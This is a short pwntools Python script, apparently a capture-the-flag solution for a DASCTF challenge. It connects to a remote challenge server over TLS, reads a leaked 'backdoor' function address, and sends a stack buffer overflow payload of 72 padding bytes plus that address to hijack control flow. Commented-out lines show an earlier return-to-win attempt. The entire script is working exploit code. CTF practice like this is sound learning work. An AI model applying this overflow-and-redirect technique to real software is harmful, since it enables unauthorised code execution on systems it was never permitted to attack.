from pwn import *

context(os="linux", arch="amd64", log_level="debug")

elf = ELF("temp/883530626036942b273c8d5078a146eb2c1c42cf80fc9b291d6d6c544a3fe277")

p=remote("879be3c38a4cd1b1cc2d6710.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="879be3c38a4cd1b1cc2d6710.tcp-ctf2.dasctf.com")
rop = ROP(elf)
#backdoor = elf.symbols["fun"]
ret = rop.find_gadget(['ret']).address
#payload = b'a'*23 + p64(ret) + p64(backdoor)


#p.sendlineafter(b'please input', payload)
#p.sendline(payload)
p.recvuntil(b'WOW:')
addr = p.recvline().strip()
backdoor = int(addr, 16)
log.success(f"backdoor = {hex(backdoor)}")
payload = b'A' * 72 + p64(backdoor)
# 5. 发送 payload
p.sendlineafter(b'>', payload)
print(p.recvall(timeout=3).decode(errors="replace"))
#p.interactive()
